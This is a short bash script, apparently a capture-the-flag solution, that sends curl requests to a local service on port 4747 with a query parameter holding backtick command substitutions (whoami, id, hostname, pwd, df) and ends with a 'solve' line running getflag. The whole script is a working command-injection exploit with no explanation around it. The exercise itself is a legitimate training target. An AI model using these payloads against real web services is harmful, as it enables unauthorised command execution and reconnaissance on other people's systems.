#!/bin/bash
#
curl localhost:4747/?x="\`/usr/bin/whoami\`" 
curl localhost:4747/?x="\`/usr/bin/id\`" 
curl localhost:4747/?x="\`/bin/hostname\`" 
curl localhost:4747/?x="\`/bin/pwd\`" 
curl localhost:4747/?x="\`/bin/df\`" 
curl localhost:4747/?x="\`$(which pwd)\`" 🟢 

# solve
curl localhost:4747/?x="\`$(which getflag)\`"

